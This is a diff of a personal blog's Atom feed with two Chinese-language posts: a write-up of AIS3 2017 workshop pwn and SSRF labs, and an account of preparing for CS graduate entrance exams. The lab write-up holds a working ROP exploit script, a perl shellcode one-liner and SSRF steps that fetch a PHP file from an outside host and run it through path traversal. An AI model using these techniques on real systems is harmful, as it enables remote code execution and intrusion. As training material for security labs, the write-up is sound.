@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://w181496.twbbs.org/"/>
-  <updated>2017-09-06T13:24:35.000Z</updated>
+  <updated>2017-09-11T14:39:05.000Z</updated>
   <id>http://w181496.twbbs.org/</id>
   
   <author>
@@ -19,7 +19,7 @@
     <link href="http://w181496.twbbs.org/2017/09/06/AIS3-2017-Workshop/"/>
     <id>http://w181496.twbbs.org/2017/09/06/AIS3-2017-Workshop/</id>
     <published>2017-09-06T08:34:36.000Z</published>
-    <updated>2017-09-06T13:24:35.000Z</updated>
+    <updated>2017-09-11T14:39:05.000Z</updated>
     <content type="html"><![CDATA[<p><img src="https://i.imgur.com/jEhADhe.png width:70%" alt=""></p>
 <h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>AIS3 workshop是AIS3上課的pwn跟SSRF練習平台。<br>因為平台好像關惹，我也懶得重搞環境打一次<br>所以下面解法很多都是憑著印象打出來的，有錯請見諒</p>
 <h2 id="lab1"><a href="#lab1" class="headerlink" title="lab1"></a>lab1</h2><a id="more"></a>
@@ -56,7 +56,7 @@
 <p>payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">puts_got = <span class="number">0x601018</span></div><div class="line">puts_plt = <span class="number">0x4004e0</span></div><div class="line">puts_off = <span class="number">0x6f690</span></div><div class="line">system_off = <span class="number">0x45390</span></div><div class="line">sh_off = <span class="number">0x18c177</span>  <span class="comment">#c99f</span></div><div class="line">pop_rdi = <span class="number">0x4006f3</span></div><div class="line">main = <span class="number">0x400636</span></div><div class="line"></div><div class="line">r = remote(<span class="string">'pwnhub.tw'</span>, <span class="number">56026</span>)</div><div class="line"></div><div class="line">r.send(<span class="string">"A"</span>*<span class="number">40</span> + p64(main) + <span class="string">"\n"</span>)</div><div class="line">r.send(<span class="string">"A"</span>*<span class="number">40</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main) + <span class="string">"\n"</span>)</div><div class="line">r.recvuntil(<span class="string">'boom !'</span>)</div><div class="line"><span class="keyword">print</span> r.recvline()</div><div class="line"><span class="keyword">print</span> r.recvline()</div><div class="line">tmp = r.recvline().strip()</div><div class="line"><span class="keyword">print</span> enhex(tmp)</div><div class="line"></div><div class="line">cool = input()  </div><div class="line"><span class="comment"># 這裏是因為我不知道怎把抓到的位址轉成值，所以直接手動輸入ㄏㄏ python好難QQ</span></div><div class="line"></div><div class="line">base = cool - puts_off</div><div class="line">base2 = cool - puts_off</div><div class="line">system = system_off + base2</div><div class="line">sh = sh_off + base</div><div class="line"></div><div class="line">r.send(<span class="string">"A"</span>*<span class="number">40</span> + p64(pop_rdi) + p64(sh) + p64(system) + p64(system) + <span class="string">"\n"</span>)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure></p>
 <p><br></p>
 <h2 id="bonus"><a href="#bonus" class="headerlink" title="bonus"></a>bonus</h2><p>這題沒給source code<br>objdump出來長這樣：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">./end:     file format elf64-x86-64</div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">00000000004000b0 &lt;_start&gt;:</div><div class="line">4000b0:   48 31 c0                xor    rax,rax</div><div class="line">4000b3: 48 31 db                xor    rbx,rbx</div><div class="line">4000b6:   48 31 c9                xor    rcx,rcx</div><div class="line">4000b9: 48 31 d2                xor    rdx,rdx</div><div class="line">4000bc:   48 31 ff                xor    rdi,rdi</div><div class="line">4000bf: 48 31 f6                xor    rsi,rsi</div><div class="line">4000c2:   4d 31 c0                xor    r8,r8</div><div class="line">4000c5: 4d 31 c9                xor    r9,r9</div><div class="line">4000c8:   4d 31 d2                xor    r10,r10</div><div class="line">4000cb: 4d 31 db                xor    r11,r11</div><div class="line">4000ce:   4d 31 e4                xor    r12,r12</div><div class="line">4000d1: 4d 31 ed                xor    r13,r13</div><div class="line">4000d4:   4d 31 f6                xor    r14,r14</div><div class="line">4000d7: 4d 31 ff                xor    r15,r15</div><div class="line">4000da:   48 31 ed                xor    rbp,rbp</div><div class="line">4000dd: e8 10 00 00 00          call   4000f2 &lt;_end&gt;</div><div class="line">4000e2:   b8 3c 00 00 00          mov    eax,0x3c</div><div class="line">4000e7: 48 31 ff                xor    rdi,rdi</div><div class="line">4000ea:   48 31 f6                xor    rsi,rsi</div><div class="line">4000ed: 48 31 d2                xor    rdx,rdx</div><div class="line">4000f0:   0f 05                   syscall </div><div class="line"></div><div class="line">00000000004000f2 &lt;_end&gt;:</div><div class="line">4000f2: 48 81 ec 28 01 00 00    sub    rsp,0x128</div><div class="line">4000f9:   48 89 e6                mov    rsi,rsp</div><div class="line">4000fc: ba 48 01 00 00          mov    edx,0x148</div><div class="line">400101:   0f 05                   syscall </div><div class="line">400103: 48 81 c4 28 01 00 00    add    rsp,0x128</div><div class="line">40010a:   c3                      ret</div></pre></td></tr></table></figure></p>
-<p>這題關鍵就是要構造編號(rax)322的system call: stub_execveat<br>他跟execve一樣可以叫出shell，底層實作似乎一樣(我沒研究就是惹…<br>那要怎麼讓rax變成322呢…<br>很簡單，因為中間會call read讀資料，只要讀322 bytes<br>返回值rax就會等於322<br>接著我們輸入的時候一開始直接輸入/bin/sh\0<br>因為rdi原本就是輸入buffer的開頭，也就是/bin/sh，所以也不用特別處理<br>唯一要注意的是execveat的其他暫存器要清成0才能work<br>在這題就是要把rdx清空才行<br>可以直接跳到0x4000ed的xor rdx, rdx就行，而且下一行就是syscall，讚讚</p>
+<p>這題關鍵就是要構造編號(rax)322的system call: stub_execveat<br>他跟execve一樣可以叫出shell，底層實作似乎一樣(我沒研究就是惹…<br>那要怎麼讓rax變成322呢…<br>很簡單，因為中間會call read讀資料，只要讀322 bytes<br>返回值rax就會等於322<br>接著我們輸入的時候一開始直接輸入/bin/sh\0<br>因為rsi(execveat的filename)原本就是輸入buffer的開頭，也就是/bin/sh，所以也不用特別處理<br>唯一要注意的是execveat的其他暫存器值要清成0才能work<br>在這題就是要把rdx清空才行((我一開始一直沒清，想說怎麼一直拿不到shell QQ<br>可以直接跳到0x4000ed的xor rdx, rdx就行，而且下一行就是syscall，讚讚</p>
 <p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;/bin/sh&quot;,&quot;\x00&quot;,&quot;\x0a\x01\x40\x00\x00\x00\x00\x00&quot;x38,&quot;\xed\x00\x40\x00\x00\x00\x00\x00&quot;,&quot;\xb0\xdd&quot;&apos;</div></pre></td></tr></table></figure></p>
 <p>FLAG大概長這樣：<code>AIS3{r0p_is_e4sy_4nd_fUn}</code></p>
 <p><br></p>
@@ -65,7 +65,7 @@
 <h2 id="Bonus_-_Jar"><a href="#Bonus_-_Jar" class="headerlink" title="Bonus - Jar"></a>Bonus - Jar</h2><p>這題有一個可以送出URL的地方<br>這裡可以SSRF，而且file://可以遍歷目錄<br>然後仔細觀察可以發現他有個<code>?page=orange</code>的參數<br>他會去load users/orange.tmp這個檔案</p>
 <p>這題就是要利用到jar協議的特性<br>塞給他一個jar:形式的網址，他會去抓這個檔案做暫存，但是抓完就會刪除暫存<br>所以就是要想辦法塞給他惡意檔案，然後讓他抓完之後不立刻結束連線<br>再想辦法去跑這個暫存檔<br>這裡我是用<a href="https://github.com/pwntester/BlockingServer" target="_blank" rel="external">https://github.com/pwntester/BlockingServer</a><br>在機器x.x.x.x上新建kaibro.php<br>跑Blocking Server: <code>java BlokingServer 12345 kaibro.php</code><br>URL的地方塞<code>jar:http://x.x.x.x:12345/kaibro.php!/</code>讓它卡住<br>再來用<code>file:///tmp/</code>去看暫存檔的名字，可能檔名叫jar_cache123456.tmp之類的<br>然後利用<code>?page=../../../../../../tmp/jar_cache123456</code>就可以跑我們的php囉</p>
 <p>FLAG長這樣：<code>hitcon{Life so hard :(}</code></p>
-<p><br></p>
+<p>Discuz因為感覺會很難所以沒解，剩下其他題的話解法應該Google都找得到(?<br><br></p>
 ]]></content>
     <summary type="html">
     <![CDATA[<p><img src="https://i.imgur.com/jEhADhe.png width:70%" alt=""></p>
@@ -130,7 +130,7 @@
     <link href="http://w181496.twbbs.org/2017/07/19/106-%E8%B3%87%E5%B7%A5%E6%89%80%E8%80%83%E8%A9%A6%E5%BF%83%E5%BE%97/"/>
     <id>http://w181496.twbbs.org/2017/07/19/106-資工所考試心得/</id>
     <published>2017-07-19T07:02:54.000Z</published>
-    <updated>2017-08-02T14:32:09.000Z</updated>
+    <updated>2017-09-11T14:53:25.000Z</updated>
     <content type="html"><![CDATA[<h2 id="u6210_u7E3E"><a href="#u6210_u7E3E" class="headerlink" title="成績"></a>成績</h2><table>
 <thead>
 <tr>
@@ -191,13 +191,14 @@
 </tr>
 </tbody>
 </table>
-<p><br></p>
-<h2 id="u6E96_u5099_u65B9_u5F0F"><a href="#u6E96_u5099_u65B9_u5F0F" class="headerlink" title="準備方式"></a>準備方式</h2><a id="more"></a>
-<p>基本上我大三下就報名補習班了，不過不是報X碩，是報X點<br>因為我當初覺得報哪家補習班理論上不會差太多<br>重點還是要靠自己努力讀<br>可是到中後期才發現，X碩的教材、課程資源的確屌打X點<br>(X點某科老師真的很雷，講義各種錯，連交大有公布正解都能給錯的答案)<br>不過當然最主要還是靠自己，補習班只是輔助的角色</p>
+<p><br><br>(開學Update: 最後除了台大資工外全都備上惹)<br><br></p>
+<h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><a id="more"></a>
+<p>因為準備考試這段時間還蠻精實，也發生很多神奇的事情<br>覺得應該過個一年以後就會全都忘光光惹<br>所以想來紀錄一下，也可以順便給剛好看到這篇的考生一個參考</p>
+<h2 id="u6E96_u5099_u65B9_u5F0F"><a href="#u6E96_u5099_u65B9_u5F0F" class="headerlink" title="準備方式"></a>準備方式</h2><p>基本上我大三下就報名補習班了，不過不是報X碩，是報X點<br>因為我當初覺得報哪家補習班理論上不會差太多<br>重點還是要靠自己努力讀<br>可是到中後期才發現，X碩的教材、課程資源的確屌打X點<br>(X點某科老師真的很雷，講義各種錯，連交大有公布正解都能給錯的答案)<br>不過當然最主要還是靠自己，補習班只是輔助的角色</p>
 <p>開始衝刺是大約暑假的時候<br>每天去中原的自習室或圖書館看書<br>讀的時間大概AM 11:00 ~ PM 12:00左右<br>讀的勤一點的時候，會從早上9、10點讀到凌晨1、2點<br>所以讀書的時間算是非常長的<br>這樣也有壞處，就是前期太積極，後期會有點無力<br>而且長時間讀，效率也會愈讀愈低</p>
-<p><strong><em>[數學]</em></strong><br>數學的話，準備方式除了上補習班課程外<br>就是在暑假的時候，把課本看完一遍<br>然後之後就是不斷複習跟刷題目<br>考古題的話，大概是最後三個月才拼命刷<br>像台大資工，我就從97刷到105，可以明顯感受到考題趨勢的變化<br>(聽說是有出題教授退休，所以後來風格變化很大)</p>
-<p><strong><em>[資演]</em></strong><br>因為一直有稍微在碰ACM競賽<br>所以這科基本上我沒花太多時間準備<br>只讀了一些競賽中不會看到的資料結構<br>然後把資結、演算法的筆記快速看過幾遍<br>剩下時間就是一直去刷I2A習題和一些難題<br>因為像台大資工，有幾年很喜歡出一些競賽經典題目或是I2A習題變化<br>可是今年台大就考得偏簡單，有點後悔花時間刷難題</p>
-<p><strong><em>[計系]</em></strong><br>台大資工的計系是出了名的詭異<br>計組感覺很愛出比較後面的章節<br>所以我花了很多時間研究幾乎每年都考的GPU<br>然後也花不少時間猜今年會考啥題目<br>也研究了很冷門的Snoopy protocol<br>恐龍本一些比較沒人考過的技術或名詞也都讀了一遍<br>但都沒考出來啊!!! 崩潰!!<br>而其他比較正常的題目，像交大資工<br>我的準備方式就是買一本順眼的筆記來啃，然後一直刷題</p>
+<p><strong><em>[數學]</em></strong><br>數學的話，準備方式除了上補習班課程外<br>就是在暑假的時候，把課本看完一遍<br>然後之後就是不斷複習跟刷題目<br>考古題的話，大概是最後三個月才拼命刷<br>像台大資工，我就從97刷到105，可以明顯感受到考題趨勢的變化<br>(聽說是有出題教授退休，所以後來風格變化很大)<br>懶得刷題目抓解題技巧的也可以去報題庫班<br>像X點的數學題庫班重點就整理得不錯</p>
+<p><strong><em>[資演]</em></strong><br>因為一直有稍微在碰ACM競賽<br>所以這科基本上我沒花太多時間準備，也沒有補題庫班<br>只讀了一些競賽中不會看到的資料結構<br>然後把資結、演算法的筆記快速看過幾遍<br>剩下時間就是一直去刷I2A習題和一些難題<br>因為像台大資工，有幾年很喜歡出一些競賽經典題目或是I2A習題變化<br>可是今年台大就考得偏簡單，有點後悔花時間刷難題</p>
+<p><strong><em>[計系]</em></strong><br>台大資工的計系是出了名的詭異<br>計組感覺很愛出比較後面的章節<br>所以我花了很多時間研究幾乎每年都考的GPU<br>然後也花不少時間猜今年會考啥題目<br>也研究了很冷門的Snoopy protocol<br>恐龍本一些比較沒人考過的技術或名詞也都讀了一遍<br>但都沒考出來啊…崩潰!!<br>而其他比較正常的題目，像交大資工<br>我的準備方式就是買一本順眼的筆記來啃，然後一直刷題</p>
 <p><br></p>
 <h2 id="u53F0_u5927_u8CC7_u5DE5"><a href="#u53F0_u5927_u8CC7_u5DE5" class="headerlink" title="台大資工"></a>台大資工</h2><p>考台大資工時數學和資演各種鬼遮眼、各種粗心計算錯誤<br>數學連第一題送分的反矩陣都算錯(10分)<br><strong><em>“不是反身也不是非反身”</em></strong>也看成<strong><em>“不是反身也不是對稱”</em></strong>(10分)…<br>更別說還考了一題10分的<strong><em>psuedo-inverse</em></strong>惹，補習班老師當初說絕對不會考，我就沒看惹，慘</p>
 <p>然後資演複雜度都算錯、LCS填空格也莫名手殘少寫、證明題還寫到一半就打鐘惹…<br>不過居然還有75分，原本以為頂多65<br>所以證明題倒扣啥的應該是嚇唬人的(?<br>感覺只要演算法是對的，就算證明寫爛也不會倒扣吧，我猜<br>因為我很確定我算法是對的，只是證明沒寫完，也寫爛了。<br>考完的時候，聽到一堆人說第一題證明是Dijkstra，我都嚇呆惹<br>這不是怎麼看都是DP嗎(?<br>證明應該就是去證他有最佳子結構跟重複子問題 (我寫到一半就收卷了QQ</p>
@@ -214,7 +215,7 @@
 <p><br></p>
 <h2 id="u4E2D_u592E_u8CC7_u5DE5"><a href="#u4E2D_u592E_u8CC7_u5DE5" class="headerlink" title="中央資工"></a>中央資工</h2><p>中央的話，就沒特別準備，只寫幾份考古就上場了<br>計系部分考了幾題卡諾圖、邏輯等題目<br>這部分其他學校幾乎不考，所以很多人直接放掉沒讀，有點可惜<br>其他像是計算機網路的部分也會考，像IPv4、IPv6等等的基本觀念會考<br>演算法部分，我覺得題目出得還算有趣，考了一題點上有權重的Dijkstra<br>數學離散很多怪題目，線代就幾乎都考古題<br>不過整體考題都偏簡單，穩住基本題就夠</p>
 <p><br></p>
-<h2 id="u7D50_u8AD6"><a href="#u7D50_u8AD6" class="headerlink" title="結論"></a>結論</h2><p>考完這麼多間的感想就是，很多學校的題目都很狂、故意刁難人<br>有的題目幾乎沒啥鑑別度，但你不會的別人通常也不會(題目難的很難，簡單的很簡單)<br>所以真的穩住基本題大概就會上惹。<br>如果跟我一樣考試容易粗心，就很容易分數會居居…<br>尤其是數學，成敗的關鍵幾乎就看這科惹<br>這科分數對大家來說相對較好掌握<br>所以如果這科粗心或放掉不讀，可能差距就一下子拉很大惹</p>
+<h2 id="u7D50_u8AD6"><a href="#u7D50_u8AD6" class="headerlink" title="結論"></a>結論</h2><p>考完這麼多間的感想就是，很多學校的題目都很狂、故意刁難人<br>有的題目幾乎沒啥鑑別度，但你不會的別人通常也不會(題目難的很難，簡單的很簡單)<br>所以真的穩住基本題大概就會上惹。<br>如果跟我一樣考試容易粗心，就很容易分數會居居…<br>尤其是數學，成敗的關鍵幾乎就看這科惹<br>這科分數對大家來說相對較好掌握<br>所以如果這科粗心或放掉不讀，可能差距就一下子拉很大惹<br><br><br>然後也很感謝準備過程中有很多人幫忙<br>像某學姊直接借我整套X碩題庫班講義<br>還有Grad-ProbAsk的各種大神幫忙解題<br>雖然過程中也損失了不少東西<br>像我的iphone被車子壓爆、趕補帶結果出車禍等等…<br>但最後還是有摸到個112也不錯了<br>希望能準時畢業QQ</p>
 ]]></content>
     <summary type="html">
     <![CDATA[<h2 id="u6210_u7E3E"><a href="#u6210_u7E3E" class="headerlink" title="成績"></a>成績</h2><table>
@@ -277,8 +278,8 @@
 </tr>
 </tbody>
 </table>
-<p><br></p>
-<h2 id="u6E96_u5099_u65B9_u5F0F"><a href="#u6E96_u5099_u65B9_u5F0F" class="headerlink" title="準備方式"></a>準備方式</h2>]]>
+<p><br><br>(開學Update: 最後除了台大資工外全都備上惹)<br><br></p>
+<h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2>]]>
     
     </summary>
     
